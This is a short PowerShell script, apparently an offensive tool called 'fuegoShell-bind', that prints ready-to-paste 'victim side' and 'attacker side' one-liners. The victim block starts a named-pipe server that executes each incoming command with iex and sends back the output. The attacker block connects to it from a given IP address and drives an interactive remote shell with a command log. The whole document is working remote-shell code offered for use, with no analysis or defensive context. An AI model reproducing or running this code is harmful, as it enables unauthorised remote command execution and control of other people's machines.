$shellprompt = "fuegoShell-bind>"
$cmdlogmsg = "[cmdlog]> "
$myVictimIPAdress = "192.168.49.1"
$fuegochannel = "fuegoshell"
Write-Host "

#
### victim side : open one powershell console ###
#
# In the powershell console : 

`$npipeServer = new-object System.IO.Pipes.NamedPipeServerStream('$fuegochannel', [System.IO.Pipes.PipeDirection]::InOut);try {'Fuegoshell-server started';'Waiting for client connection';`$npipeServer.WaitForConnection();'Connection established';`$pipeReader = new-object System.IO.StreamReader(`$npipeServer);`$script:pipeWriter = new-object System.IO.StreamWriter(`$npipeServer);`$pipeWriter.AutoFlush = `$true;`$pipeWriter.WriteLine('Connected on '+`$env:computername);while (1){`$pipeWriter.WriteLine('YOURMOVE');`$command = `$pipeReader.ReadLine();if (`$command -eq 'exit') { break }try {`$data = iex `$command | Out-String ;}catch {`$data = 'error : maybe empty or wrong command line';}`$msg = `$data;`$pipeWriter.WriteLine(`$msg);}Start-Sleep -Seconds 2;}finally {'Shell exiting';`$npipeServer.Dispose();}

#
### attacker side : open one powershell console ###
#
# In the powershell console run : 

`$npipeClient = new-object System.IO.Pipes.NamedPipeClientStream('$myVictimIPAdress', '$fuegochannel', [System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None, [System.Security.Principal.TokenImpersonationLevel]::Impersonation);`$pipeReader = `$pipeWriter = `$null;try {'Fuegoshell-client started';'Connecting to shell...';`$npipeClient.Connect();`$pipeReader = new-object System.IO.StreamReader(`$npipeClient);`$pipeWriter = new-object System.IO.StreamWriter(`$npipeClient);`$pipeWriter.AutoFlush = `$true;`$pipeReader.ReadLine();while (1) { while ((`$msg = `$pipeReader.ReadLine()) -notmatch 'YOURMOVE') {`$msg;}`$command = Read-Host '$shellprompt';if (`$command -eq 'exit') { `$pipeWriter.WriteLine(`$command);break ;}`$pipeWriter.WriteLine(`$command) ;`$currentDate = Get-Date -Format `"yyyyMMdd_HHmmss`" ;`$cmdlogmsg = '$cmdlogmsg';`$data = `$pipeReader.ReadLine();`$msg = `$currentDate+`$cmdlogmsg+`$data;`$msg;}}finally {'Shell exiting';`$npipeClient.Dispose();}

"
